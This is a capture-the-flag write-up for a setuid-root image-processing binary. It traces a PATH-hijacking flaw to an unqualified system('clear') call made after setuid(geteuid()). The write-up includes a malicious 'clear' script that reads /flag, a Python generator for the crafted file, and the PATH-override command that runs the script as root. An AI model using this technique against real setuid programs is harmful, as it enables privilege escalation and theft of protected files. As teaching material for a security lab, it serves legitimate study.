# cIMG Directive Extensibility - Challenge Writeup

## Challenge Overview

The challenge involves a setuid-root binary (`cimg`) that processes a custom image file format (cIMG). The binary reads a cIMG file, processes directives (numbered 1-7), and renders the result. The hint references "Pondering PATH" — pointing directly at a PATH hijacking vulnerability.

## Analysis

### The Binary

The `cimg` binary:
- Is setuid root (`rwsr-xr-x`)
- Reads a `.cimg` file with a specific header format
- Processes directives in a loop based on `remaining_directives` count
- Includes `cimg-handlers.c` (not provided) which implements handlers for directives 1-7

### The Vulnerability in Directive 6

Disassembling `handle_6` reveals:

```
handle_6:
    read_exact(0, &byte, 1, "ERROR: Failed to read &clear!", -1)
    setuid(geteuid())
    system("clear")
```

Key observations:
- After reading 1 byte (unused), it calls `setuid(geteuid())` — since this is setuid root, both return 0, making the process fully root
- It then calls `system("clear")` — **without a full path**
- `system()` uses `/bin/sh -c` which resolves the command via the `PATH` environment variable

### The "Shenanigans" Check

Directive 5 (sprite loading) checks if loaded sprite data starts with `pwn.college{` (the flag prefix), and rejects it with "ERROR: shenanigans detected!!!!!". This prevents directly embedding the flag via sprite rendering — but it's irrelevant since we bypass it entirely.

## Exploitation

### Step 1: Create a malicious `clear` script

```sh
#!/bin/sh
cat /flag
```

Place this in a directory we control and make it executable.

### Step 2: Craft a cIMG file with directive 6

The cIMG header format:
- Magic: `cIMG` (4 bytes)
- Version: `4` (uint16 LE)
- Width: 1 byte
- Height: 1 byte
- Remaining directives: uint32 LE

Directive 6 format:
- Directive code: `6` (uint16 LE)
- 1 unused byte

Minimal Python generator:

```python
import struct
with open("solve.cimg", "wb") as f:
    f.write(b"cIMG")
    f.write(struct.pack("<H", 4))   # version
    f.write(struct.pack("B", 1))    # width
    f.write(struct.pack("B", 1))    # height
    f.write(struct.pack("<I", 1))   # 1 directive
    f.write(struct.pack("<H", 6))   # directive 6
    f.write(b"\x00")                # unused byte
```

### Step 3: Execute with modified PATH

```sh
PATH=/path/to/malicious/clear:$PATH /challenge/cimg solve.cimg
```

When `handle_6` runs, `system("clear")` resolves `clear` via PATH to our malicious script, which runs as root and reads `/flag`.

## Flag

The flag was obtained successfully.
